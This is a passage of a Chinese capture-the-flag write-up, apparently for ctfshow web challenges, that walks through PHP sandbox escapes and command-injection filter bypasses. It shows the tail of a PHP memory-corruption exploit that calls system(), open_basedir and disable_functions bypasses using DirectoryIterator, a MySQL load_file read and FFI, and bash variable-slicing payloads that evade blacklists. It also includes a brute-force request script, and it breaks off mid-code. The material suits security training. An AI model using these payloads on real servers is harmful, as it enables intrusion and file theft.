class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码哦</span></span><br></pre></td></tr></table></figure><hr /><h1 id="web73-web74"><a href="#web73-web74" class="headerlink" title="web73~web74"></a>web73~web74</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无代码</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>然后include一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure><hr /><p>web74的脚本和上面的一样！再来敲一遍！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> DirectorIterator(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagx.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><hr /><h1 id="web75-不会"><a href="#web75-不会" class="headerlink" title="web75(不会)"></a>web75(不会)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这是个hint！<br>用这个来进行！</p><hr /><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p></blockquote><p>这里接着使用上个命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>然后利用FF1扩展！php7.4才有！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;/readflag &gt;flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>此时再访问flag.txt页面就可以了！</p><hr /><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><p>有个提示说flag在flag.php中，页面是个输入框！<br><img src="https://img-blog.csdnimg.cn/20210414210346608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码里也有个提示！<br>fuzz测试后只有大写字母和${}:?.~能通过！<br>此时要使用bash内置变量进行利用了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD&#125; </span><br><span class="line">&#x2F;root</span><br><span class="line">                                                                                                      </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符</span><br><span class="line">&#x2F;                                                                                                                                                                                       </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符</span><br><span class="line">t</span><br><span class="line">                                                                                </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~0&#125;      </span><br><span class="line">t</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             </span><br><span class="line">t</span><br><span class="line">                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PATH&#125;                            </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PATH:~A&#125;                </span><br><span class="line">n</span><br><span class="line">                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ls                                      </span><br><span class="line">Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# $&#123;PATH:~A&#125;l flag.txt</span><br><span class="line">     1  flag&#123;test&#125;</span><br><span class="line">                    </span><br></pre></td></tr></table></figure><p>先来介绍一下！echo ${PWD} 这个命令是打印出当前的路径，当然这里也具有python里面的切片功能的！<br>此时我们可以进行构造出nl命令进行读取！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;PATH&#125;</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line"></span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">所以payload为</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line">当然这样也可以：</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">这里再来做几个实验！</span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;#HOME&#125; </span><br><span class="line">5</span><br><span class="line">                                                                          </span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;#SHLVL&#125;</span><br><span class="line">1</span><br><span class="line">                                                                          </span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;PATH&#125;  </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games</span><br><span class="line">                                                                          </span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;</span><br><span class="line">l</span><br><span class="line">                                                                          </span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;#RANDOM&#125;                </span><br><span class="line">4</span><br><span class="line">                                                                          </span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;</span><br><span class="line">l</span><br><span class="line">                                                                          </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414211938136.png" alt="在这里插入图片描述"></p><hr /><h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>这次将path给禁止了，所以我们不能构造了nl了，我们可以构造cat这个，它的权限一般为<a href="http://www.data这里可以得到at/">www.data这里可以得到at</a>.</p><blockquote><p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时 $ {SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。</p></blockquote><p>php版本是7.3.22这就有了2这个数字了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;                                         1 ⨯</span><br><span class="line">&#x2F;</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;#HOSTNAME&#125;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;</span><br><span class="line">&#x2F;</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;#IFS&#125;                                                      1 ⨯</span><br><span class="line">4</span><br><span class="line">                                                                          </span><br><span class="line">┌──(root💀kali)-[&#x2F;]</span><br><span class="line">└─# echo $&#123;##&#125;  </span><br><span class="line">1</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line">或</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line">这个是&#x2F;bin&#x2F;base64 flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这个是hint</span><br><span class="line">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     &#x3D;&#x3D;&#x3D;&#x3D;&gt;   t</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    &#x3D;&#x3D;&#x3D;&#x3D;&gt;   &#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;cat flag.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><hr /><h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload的长度为65以内！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><hr /><h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><p>rev命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里将USER禁止了！可以利用rev进行反读文件！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><p>这样子得到的是反的flag！</p><h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>这里将PWD和#给禁止了，所以我们换一个命令/bin/base64,这次有HOME。</p><blockquote><p>$? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</p></blockquote><p>报错对应的值！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input&#x2F;output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint：</span><br><span class="line">payload:code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br><span class="line">#可能存在成功的机会，不断刷新</span><br></pre></td></tr></table></figure><p>上个脚本来跑！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://535535a0-6332-4ade-a0a3-09defd9a7928.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">dataer = &#123;<span class="string">&#x27;code&#x27;</span>:<span class="string">r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = requests.post(url,data = dataer)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210414215942600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web124-未做完"><a href="#web124-未做完" class="headerlink" title="web124(未做完)"></a>web124(未做完)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, 